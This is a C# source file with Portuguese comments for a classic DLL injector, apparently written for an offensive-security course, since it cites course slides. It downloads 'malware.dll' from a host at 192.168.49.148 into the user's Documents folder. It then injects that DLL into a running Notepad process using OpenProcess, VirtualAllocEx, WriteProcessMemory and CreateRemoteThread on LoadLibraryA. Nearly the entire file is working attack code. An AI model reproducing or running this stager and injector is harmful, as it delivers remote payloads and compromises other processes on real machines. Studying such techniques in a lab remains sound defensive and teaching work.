using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace DLLInjector
{
    internal class Program
    {
        // Valores constantes para tornar o código mais legível
        // Exemplos comuns usados em injeção de DLL e operações de memória remota.
        public const uint PROCESS_ALL_ACCESS = 0x001F0FFF; // acesso completo ao processo
        public const uint MEM_COMMIT = 0x1000;
        public const uint MEM_RESERVE = 0x2000;
        public const uint MEM_COMMIT_RESERVE = MEM_COMMIT | MEM_RESERVE; // 0x3000
        public const uint PAGE_EXECUTE_READWRITE = 0x40; // permite leitura, escrita e execução

        // Abre um handle para um processo existente.
        // Parâmetros:
        // - processAccess: máscaras de acesso desejadas (ex.: PROCESS_ALL_ACCESS = 0x001F0FFF).
        // - bInheritHandle: se true, o handle pode ser herdado por processos filhos.
        // - processId: ID do processo alvo (PID).
        // Retorno: handle para o processo (IntPtr.Zero em falha). Use GetLastError para detalhes.
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        // Aloca memória no espaço de endereçamento do processo remoto.
        // Parâmetros:
        // - hProcess: handle do processo remoto (obtido via OpenProcess).
        // - lpAddress: endereço sugerido (IntPtr.Zero para o sistema escolher).
        // - dwSize: número de bytes a alocar.
        // - flAllocationType: tipo de alocação (ex.: MEM_COMMIT | MEM_RESERVE = 0x3000).
        // - flProtect: proteção de memória (ex.: PAGE_EXECUTE_READWRITE = 0x40).
        // Retorno: endereço base alocado no processo remoto (IntPtr.Zero em falha).
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        // Escreve dados no espaço de memória de outro processo.
        // Parâmetros:
        // - hProcess: handle do processo com permissão de escrita (PROCESS_VM_WRITE | PROCESS_VM_OPERATION).
        // - lpBaseAddress: endereço onde os dados serão escritos no processo remoto.
        // - lpBuffer: buffer local contendo os bytes a serem escritos.
        // - nSize: quantidade de bytes a escrever.
        // - lpNumberOfBytesWritten: saída com quantidade efetivamente escrita.
        // Retorno: true em sucesso; false em falha.
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

        // Cria uma thread no processo remoto, iniciando execução em lpStartAddress.
        // Parâmetros:
        // - hProcess: handle do processo remoto.
        // - lpThreadAttributes: segurança da thread (geralmente IntPtr.Zero).
        // - dwStackSize: tamanho da pilha da thread (0 usa o padrão).
        // - lpStartAddress: endereço de função no processo remoto onde a thread começará (ex.: LoadLibraryA).
        // - lpParameter: parâmetro passado à função (ex.: ponteiro para a string do caminho da DLL alocado remotamente).
        // - dwCreationFlags: flags de criação (ex.: CREATE_SUSPENDED).
        // - lpThreadId: saída opcional com o ID da thread criada.
        // Retorno: handle da thread criada (IntPtr.Zero em falha).
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        // Retorna o handle de um módulo já carregado no processo atual (ex.: kernel32.dll).
        // Parâmetros:
        // - lpModuleName: nome do módulo (null retorna handle do processo atual).
        // Retorno: handle do módulo no processo atual (IntPtr.Zero em falha).
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        // Procura o endereço de uma função exportada em um módulo carregado.
        // Parâmetros:
        // - hModule: handle do módulo (obtido por GetModuleHandle ou LoadLibrary).
        // - procName: nome da função exportada (ex.: "LoadLibraryA").
        // Retorno: ponteiro para a função no espaço de endereço do processo atual.
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        static void Main(string[] args)
        {
            // 1. Configurações de Rede e Caminho Dinâmico
            string url = "http://192.168.49.148/malware.dll";

            // Obtém o caminho da pasta "My Documents" do usuário atual dinamicamente
            string myDocuments = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string dllPath = Path.Combine(myDocuments, "malware.dll");

            // 2. Download da DLL (Simulando o Staging do Stager)
            try
            {
                Console.WriteLine($"[*] Baixando DLL de {url}...");
                WebClient wc = new WebClient();
                wc.DownloadFile(url, dllPath);
                Console.WriteLine($"[+] DLL salva em: {dllPath}");
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Erro no download: {e.Message}");
                return;
            }

            // 3. Localizar Processo Alvo
            Process[] targetProcs = Process.GetProcessesByName("notepad");
            if (targetProcs.Length == 0)
            {
                Console.WriteLine("[-] Alvo não encontrado. Abra o Notepad primeiro.");
                return;
            }
            int pid = targetProcs[0].Id;

            // 4. Fluxo de Injeção Clássica (conforme slides 83-85 do material) [cite: 433, 434]
            // Abre o processo alvo com acesso total (PROCESS_ALL_ACCESS = 0x001F0FFF)
            // Atenção: em sistemas modernos você pode precisar de elevação (Admin) e permissões adequadas.
            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);

            // Aloca memória no processo remoto para armazenar a string do caminho da DLL.
            // - flAllocationType = 0x3000 => MEM_COMMIT (0x1000) | MEM_RESERVE (0x2000)
            // - flProtect = 0x40 => PAGE_EXECUTE_READWRITE (permite executar e escrever)
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)dllPath.Length + 1, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE);

            // Converte o caminho para bytes e escreve no processo remoto
            byte[] pathBytes = Encoding.Default.GetBytes(dllPath);
            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, pathBytes, (uint)pathBytes.Length, out outSize);

            // Obtém o endereço de LoadLibraryA no processo atual. Em geral, kernel32.dll está carregado
            // no mesmo endereço relativo em processos do mesmo bitness, então podemos reutilizar esse endereço.
            IntPtr loadLibAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

            // Cria uma thread remota que chama LoadLibraryA(addr), fazendo com que o processo remoto carregue nossa DLL.
            // - lpStartAddress = loadLibAddr (endereço de LoadLibraryA)
            // - lpParameter = addr (ponteiro para a string do caminho da DLL no processo remoto)
            // - dwCreationFlags = 0 (inicia imediatamente). Poderíamos usar CREATE_SUSPENDED para controle adicional.
            CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibAddr, addr, 0, IntPtr.Zero);

            Console.WriteLine($"[+] DLL Injetada com sucesso no PID: {pid}");
        }
    }
}
